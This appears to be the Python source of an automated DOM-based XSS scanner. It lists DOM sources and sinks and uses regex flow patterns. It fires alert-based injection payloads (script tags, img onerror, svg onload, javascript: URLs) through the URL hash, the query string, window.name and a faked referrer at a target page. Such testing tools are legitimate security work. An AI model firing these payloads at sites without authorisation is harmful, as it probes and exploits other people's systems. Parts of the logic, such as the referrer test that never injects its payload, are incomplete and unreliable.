#!/usr/bin/env python3
"""
DOM-based XSS Detection Agent
Specializes in detecting DOM-based/Type-0 XSS vulnerabilities
"""

import asyncio
import json
import logging
import re
from datetime import datetime
from typing import Dict, List, Any, Optional, Set, Tuple
from urllib.parse import urlparse, urljoin, quote

from agno.agent import Agent
from playwright.async_api import async_playwright, Page, Browser, Response
from core.models import (
    DOMXSSContext, PayloadAttempt, VerificationResult, 
    VulnerabilityContext, XSSType, DetectionMethod
)
from core.utils import get_timestamp, Timer


class DOMXSSAgent(Agent):
    """Agent for detecting DOM-based XSS vulnerabilities"""
    
    def __init__(self, config: Optional[Dict] = None):
        super().__init__()
        self.config = config or {}
        self.logger = logging.getLogger(self.__class__.__name__)
        
        # DOM XSS specific configuration
        self.analysis_timeout = self.config.get('dom_analysis_timeout', 15)
        self.payload_timeout = self.config.get('payload_timeout', 5)
        self.max_depth_analysis = self.config.get('max_depth_analysis', 3)
        
        # JavaScript sources that can be controlled by attacker
        self.dom_sources = [
            'location.hash', 'location.search', 'location.href',
            'document.URL', 'document.documentURI', 'document.referrer', 
            'window.name', 'history.pushState', 'history.replaceState',
            'localStorage', 'sessionStorage', 'document.cookie'
        ]
        
        # JavaScript sinks that can cause XSS
        self.dom_sinks = [
            'document.write', 'document.writeln', 'innerHTML', 'outerHTML',
            'insertAdjacentHTML', 'document.createElement', 'eval', 'setTimeout',
            'setInterval', 'Function', 'execScript', 'location.href', 'location.assign',
            'location.replace', 'document.location', 'window.open'
        ]
        
        # DOM XSS payloads optimized for different contexts
        self.dom_payloads = {
            'hash': [
                '#<img src=x onerror=alert("DOM-XSS-Hash")>',
                '#"><script>alert("DOM-XSS-Hash")</script>',
                '#javascript:alert("DOM-XSS-Hash")',
                '#<svg onload=alert("DOM-XSS-Hash")>',
                '#<iframe src="javascript:alert(\'DOM-XSS-Hash\')"></iframe>'
            ],
            'search': [
                '?xss=<script>alert("DOM-XSS-Search")</script>',
                '?param="><img src=x onerror=alert("DOM-XSS-Search")>',
                '?data=javascript:alert("DOM-XSS-Search")',
                '?input=<svg onload=alert("DOM-XSS-Search")>'
            ],
            'name': [
                '<script>alert("DOM-XSS-Name")</script>',
                '<img src=x onerror=alert("DOM-XSS-Name")>',
                'javascript:alert("DOM-XSS-Name")'
            ],
            'referrer': [
                '<script>alert("DOM-XSS-Referrer")</script>',
                '<img src=x onerror=alert("DOM-XSS-Referrer")>'
            ]
        }
    
    async def run(self, target_url: str, discovered_sources: Optional[List[str]] = None) -> List[Dict[str, Any]]:
        """Main DOM XSS detection workflow"""
        
        self.logger.info(f"Starting DOM XSS detection for {target_url}")
        
        with Timer("DOM XSS Detection") as timer:
            # Phase 1: Static analysis - find DOM sources and sinks
            static_analysis = await self._static_dom_analysis(target_url)
            
            # Phase 2: Dynamic analysis - test DOM manipulation
            dynamic_findings = await self._dynamic_dom_testing(target_url, static_analysis)
            
            # Phase 3: Source-specific testing
            source_specific_findings = await self._test_dom_sources(target_url)
            
            # Phase 4: Combine and analyze findings
            all_findings = self._combine_findings(static_analysis, dynamic_findings, source_specific_findings)
            
            # Phase 5: Verify and categorize
            verified_findings = await self._verify_dom_findings(all_findings)
        
        self.logger.info(f"DOM XSS detection completed in {timer.elapsed:.2f} seconds")
        self.logger.info(f"Found {len(verified_findings)} potential DOM XSS vulnerabilities")
        
        return verified_findings
    
    async def _static_dom_analysis(self, target_url: str) -> Dict[str, Any]:
        """Analyze JavaScript code for DOM XSS patterns"""
        
        self.logger.info("Performing static DOM analysis...")
        
        analysis_result = {
            'sources_found': [],
            'sinks_found': [],
            'dangerous_flows': [],
            'javascript_content': [],
            'external_scripts': []
        }
        
        async with async_playwright() as p:
            browser = await p.chromium.launch(headless=self.config.get('headless', True))
            context = await browser.new_context()
            page = await context.new_page()
            
            try:
                # Capture all script sources
                script_urls = []
                
                def handle_response(response: Response):
                    if 'javascript' in response.headers.get('content-type', '').lower():
                        script_urls.append(response.url)
                
                page.on('response', handle_response)
                
                # Navigate and wait for scripts to load
                await page.goto(target_url, wait_until='networkidle', timeout=30000)
                await page.wait_for_timeout(3000)
                
                # Extract inline JavaScript
                inline_scripts = await page.evaluate('''
                    () => {
                        const scripts = Array.from(document.querySelectorAll('script'));
                        return scripts.map(script => ({
                            src: script.src || null,
                            content: script.src ? null : script.textContent,
                            type: script.type || 'text/javascript'
                        }));
                    }
                ''')
                
                # Analyze JavaScript content
                for script in inline_scripts:
                    if script['content']:
                        analysis_result['javascript_content'].append(script['content'])
                        self._analyze_js_content(script['content'], analysis_result)
                    elif script['src']:
                        analysis_result['external_scripts'].append(script['src'])
                
                # Fetch and analyze external scripts
                for script_url in script_urls:
                    if self._is_same_origin(script_url, target_url):
                        try:
                            script_content = await self._fetch_script_content(page, script_url)
                            if script_content:
                                analysis_result['javascript_content'].append(script_content[:1000])  # Truncate
                                self._analyze_js_content(script_content, analysis_result)
                        except Exception as e:
                            self.logger.warning(f"Could not fetch script {script_url}: {e}")
                
            except Exception as e:
                self.logger.error(f"Error during static analysis: {e}")
            finally:
                await browser.close()
        
        self.logger.info(f"Static analysis complete. Found {len(analysis_result['sources_found'])} sources, "
                        f"{len(analysis_result['sinks_found'])} sinks")
        
        return analysis_result
    
    def _analyze_js_content(self, js_content: str, analysis_result: Dict[str, Any]):
        """Analyze JavaScript content for DOM XSS patterns"""
        
        # Look for DOM sources
        for source in self.dom_sources:
            if re.search(rf'\b{re.escape(source)}\b', js_content, re.IGNORECASE):
                analysis_result['sources_found'].append(source)
        
        # Look for DOM sinks
        for sink in self.dom_sinks:
            if re.search(rf'\b{re.escape(sink)}\b', js_content, re.IGNORECASE):
                analysis_result['sinks_found'].append(sink)
        
        # Look for dangerous data flows (source -> sink)
        self._detect_dangerous_flows(js_content, analysis_result)
    
    def _detect_dangerous_flows(self, js_content: str, analysis_result: Dict[str, Any]):
        """Detect dangerous data flows from sources to sinks"""
        
        # Simple pattern matching for common dangerous flows
        dangerous_patterns = [
            r'(location\.hash|location\.search|location\.href).*?(innerHTML|document\.write)',
            r'(document\.URL|document\.referrer).*?(eval|setTimeout|innerHTML)',
            r'(window\.name).*?(document\.write|innerHTML)',
            r'(location\.hash).*?(location\.href|location\.assign)'
        ]
        
        for pattern in dangerous_patterns:
            matches = re.finditer(pattern, js_content, re.IGNORECASE | re.DOTALL)
            for match in matches:
                flow_info = {
                    'pattern': pattern,
                    'matched_text': match.group()[:100],  # Truncate
                    'position': match.start()
                }
                analysis_result['dangerous_flows'].append(flow_info)
    
    async def _dynamic_dom_testing(self, target_url: str, static_analysis: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Dynamically test DOM manipulation with payloads"""
        
        self.logger.info("Performing dynamic DOM testing...")
        findings = []
        
        async with async_playwright() as p:
            browser = await p.chromium.launch(headless=self.config.get('headless', True))
            context = await browser.new_context()
            page = await context.new_page()
            
            # Set up monitoring
            dom_mutations = []
            alerts_caught = []
            console_errors = []
            
            # Monitor DOM mutations
            await page.add_init_script('''
                const observer = new MutationObserver((mutations) => {
                    mutations.forEach((mutation) => {
                        if (mutation.type === 'childList' || mutation.type === 'attributes') {
                            window.domMutations = window.domMutations || [];
                            window.domMutations.push({
                                type: mutation.type,
                                target: mutation.target.tagName,
                                addedNodes: mutation.addedNodes.length,
                                removedNodes: mutation.removedNodes.length,
                                timestamp: Date.now()
                            });
                        }
                    });
                });
                observer.observe(document.body || document.documentElement, {
                    childList: true,
                    subtree: true,
                    attributes: true
                });
            ''')
            
            # Monitor alerts and console
            async def handle_dialog(dialog):
                alerts_caught.append({
                    'message': dialog.message,
                    'type': dialog.type,
                    'timestamp': get_timestamp()
                })
                await dialog.accept()
            
            def handle_console(msg):
                if msg.type == 'error':
                    console_errors.append({
                        'text': msg.text,
                        'timestamp': get_timestamp()
                    })
            
            page.on('dialog', handle_dialog)
            page.on('console', handle_console)
            
            try:
                # Test each source type if found in static analysis
                for source in static_analysis['sources_found']:
                    if 'location.hash' in source:
                        await self._test_hash_source(page, target_url, findings, alerts_caught)
                    elif 'location.search' in source:
                        await self._test_search_source(page, target_url, findings, alerts_caught)
                    elif 'window.name' in source:
                        await self._test_name_source(page, target_url, findings, alerts_caught)
                    elif 'document.referrer' in source:
                        await self._test_referrer_source(page, target_url, findings, alerts_caught)
                
                # Generic DOM manipulation testing
                await self._test_generic_dom_manipulation(page, target_url, findings, alerts_caught)
                
            except Exception as e:
                self.logger.error(f"Error during dynamic testing: {e}")
            finally:
                await browser.close()
        
        self.logger.info(f"Dynamic testing complete. Found {len(findings)} potential vulnerabilities")
        return findings
    
    async def _test_hash_source(self, page: Page, base_url: str, findings: List[Dict], alerts_caught: List[Dict]):
        """Test location.hash as XSS source"""
        
        for payload in self.dom_payloads['hash']:
            try:
                test_url = base_url + payload
                
                # Clear previous alerts
                alerts_caught.clear()
                
                await page.goto(test_url, wait_until='domcontentloaded', timeout=self.payload_timeout * 1000)
                await page.wait_for_timeout(2000)
                
                # Check if payload executed
                if alerts_caught:
                    finding = {
                        'source': 'location.hash',
                        'payload': payload,
                        'url': test_url,
                        'executed': True,
                        'alerts': alerts_caught.copy(),
                        'timestamp': get_timestamp()
                    }
                    findings.append(finding)
                    self.logger.info(f"DOM XSS via hash detected: {payload}")
                
            except Exception as e:
                self.logger.debug(f"Error testing hash payload {payload}: {e}")
    
    async def _test_search_source(self, page: Page, base_url: str, findings: List[Dict], alerts_caught: List[Dict]):
        """Test location.search as XSS source"""
        
        for payload in self.dom_payloads['search']:
            try:
                test_url = base_url + payload
                
                alerts_caught.clear()
                
                await page.goto(test_url, wait_until='domcontentloaded', timeout=self.payload_timeout * 1000)
                await page.wait_for_timeout(2000)
                
                if alerts_caught:
                    finding = {
                        'source': 'location.search',
                        'payload': payload,
                        'url': test_url,
                        'executed': True,
                        'alerts': alerts_caught.copy(),
                        'timestamp': get_timestamp()
                    }
                    findings.append(finding)
                    self.logger.info(f"DOM XSS via search detected: {payload}")
                
            except Exception as e:
                self.logger.debug(f"Error testing search payload {payload}: {e}")
    
    async def _test_name_source(self, page: Page, base_url: str, findings: List[Dict], alerts_caught: List[Dict]):
        """Test window.name as XSS source"""
        
        for payload in self.dom_payloads['name']:
            try:
                # Set window.name and navigate
                await page.evaluate(f'window.name = {json.dumps(payload)}')
                
                alerts_caught.clear()
                
                await page.goto(base_url, wait_until='domcontentloaded', timeout=self.payload_timeout * 1000)
                await page.wait_for_timeout(2000)
                
                if alerts_caught:
                    finding = {
                        'source': 'window.name',
                        'payload': payload,
                        'url': base_url,
                        'executed': True,
                        'alerts': alerts_caught.copy(),
                        'timestamp': get_timestamp()
                    }
                    findings.append(finding)
                    self.logger.info(f"DOM XSS via window.name detected: {payload}")
                
            except Exception as e:
                self.logger.debug(f"Error testing name payload {payload}: {e}")
    
    async def _test_referrer_source(self, page: Page, base_url: str, findings: List[Dict], alerts_caught: List[Dict]):
        """Test document.referrer as XSS source"""
        
        for payload in self.dom_payloads['referrer']:
            try:
                # Create fake referrer page with payload
                fake_referrer = f"data:text/html,<script>location.href='{base_url}'</script>"
                # Note: This is a simplified test - real referrer manipulation requires more setup
                
                alerts_caught.clear()
                
                await page.goto(fake_referrer, wait_until='domcontentloaded', timeout=self.payload_timeout * 1000)
                await page.wait_for_timeout(2000)
                
                if alerts_caught:
                    finding = {
                        'source': 'document.referrer',
                        'payload': payload,
                        'url': base_url,
                        'executed': True,
                        'alerts': alerts_caught.copy(),
                        'timestamp': get_timestamp()
                    }
                    findings.append(finding)
                    self.logger.info(f"DOM XSS via referrer detected: {payload}")
                
            except Exception as e:
                self.logger.debug(f"Error testing referrer payload {payload}: {e}")
    
    async def _test_generic_dom_manipulation(self, page: Page, base_url: str, findings: List[Dict], alerts_caught: List[Dict]):
        """Test generic DOM manipulation patterns"""
        
        generic_payloads = [
            'javascript:alert("DOM-XSS-Generic")',
            '<img src=x onerror=alert("DOM-XSS-Generic")>',
            '<svg onload=alert("DOM-XSS-Generic")>',
            '"><script>alert("DOM-XSS-Generic")</script>'
        ]
        
        for payload in generic_payloads:
            try:
                # Test various injection methods
                test_methods = [
                    f"{base_url}#{payload}",
                    f"{base_url}?test={quote(payload)}",
                    f"{base_url}?q={quote(payload)}"
                ]
                
                for test_url in test_methods:
                    alerts_caught.clear()
                    
                    await page.goto(test_url, wait_until='domcontentloaded', timeout=self.payload_timeout * 1000)
                    await page.wait_for_timeout(1500)
                    
                    if alerts_caught:
                        finding = {
                            'source': 'generic_dom',
                            'payload': payload,
                            'url': test_url,
                            'executed': True,
                            'alerts': alerts_caught.copy(),
                            'timestamp': get_timestamp()
                        }
                        findings.append(finding)
                        self.logger.info(f"Generic DOM XSS detected: {payload}")
                        break  # Found working vector, move to next payload
                
            except Exception as e:
                self.logger.debug(f"Error testing generic payload {payload}: {e}")
    
    async def _test_dom_sources(self, target_url: str) -> List[Dict[str, Any]]:
        """Test specific DOM sources systematically"""
        
        self.logger.info("Testing DOM sources systematically...")
        source_findings = []
        
        # This would be expanded to test each DOM source more thoroughly
        # For now, included in dynamic testing above
        
        return source_findings
    
    def _combine_findings(self, static_analysis: Dict[str, Any], 
                         dynamic_findings: List[Dict[str, Any]], 
                         source_findings: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Combine all findings into comprehensive results"""
        
        combined_findings = []
        
        # Add dynamic findings with static context
        for finding in dynamic_findings:
            enhanced_finding = finding.copy()
            enhanced_finding['static_analysis'] = {
                'sources_in_code': static_analysis['sources_found'],
                'sinks_in_code': static_analysis['sinks_found'],
                'dangerous_flows': len(static_analysis['dangerous_flows'])
            }
            combined_findings.append(enhanced_finding)
        
        # Add source-specific findings
        combined_findings.extend(source_findings)
        
        return combined_findings
    
    async def _verify_dom_findings(self, findings: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Verify and enhance DOM XSS findings"""
        
        verified_findings = []
        
        for finding in findings:
            # Assess severity
            severity = self._assess_dom_severity(finding)
            finding['severity'] = severity
            
            # Add XSS type and detection method
            finding['xss_type'] = 'dom_based'
            finding['detection_method'] = 'dom_xss_agent'
            
            # Take screenshot if executed
            if finding.get('executed') and finding.get('url'):
                try:
                    screenshot_path = await self._take_verification_screenshot(finding['url'])
                    finding['screenshot_path'] = screenshot_path
                except Exception as e:
                    self.logger.warning(f"Could not take verification screenshot: {e}")
            
            verified_findings.append(finding)
        
        return verified_findings
    
    def _assess_dom_severity(self, finding: Dict[str, Any]) -> str:
        """Assess severity of DOM XSS finding"""
        
        if finding.get('executed'):
            # High severity if payload actually executed
            return 'high'
        elif finding.get('static_analysis', {}).get('dangerous_flows', 0) > 0:
            # Medium if dangerous flows detected in static analysis
            return 'medium'
        else:
            # Low for potential vulnerabilities
            return 'low'
    
    async def _take_verification_screenshot(self, url: str) -> Optional[str]:
        """Take screenshot for verification"""
        
        try:
            async with async_playwright() as p:
                browser = await p.chromium.launch(headless=True)
                page = await browser.new_page()
                
                await page.goto(url, wait_until='domcontentloaded', timeout=10000)
                await page.wait_for_timeout(2000)
                
                screenshot_name = f"dom_xss_verification_{get_timestamp()}.png"
                screenshot_path = f"screenshots/{screenshot_name}"
                await page.screenshot(path=screenshot_path, full_page=True)
                
                await browser.close()
                return screenshot_path
        
        except Exception as e:
            self.logger.error(f"Error taking verification screenshot: {e}")
            return None
    
    def _is_same_origin(self, url1: str, url2: str) -> bool:
        """Check if two URLs are same origin"""
        parsed1 = urlparse(url1)
        parsed2 = urlparse(url2)
        return (parsed1.scheme == parsed2.scheme and 
                parsed1.netloc == parsed2.netloc)
    
    async def _fetch_script_content(self, page: Page, script_url: str) -> Optional[str]:
        """Fetch external script content"""
        try:
            response = await page.request.get(script_url)
            if response.status == 200:
                return await response.text()
        except Exception as e:
            self.logger.debug(f"Could not fetch script content from {script_url}: {e}")
        return None
    
    def get_statistics(self) -> Dict[str, Any]:
        """Get statistics about DOM XSS detection"""
        return {
            'supported_sources': len(self.dom_sources),
            'supported_sinks': len(self.dom_sinks),
            'total_payloads': sum(len(payloads) for payloads in self.dom_payloads.values())
        }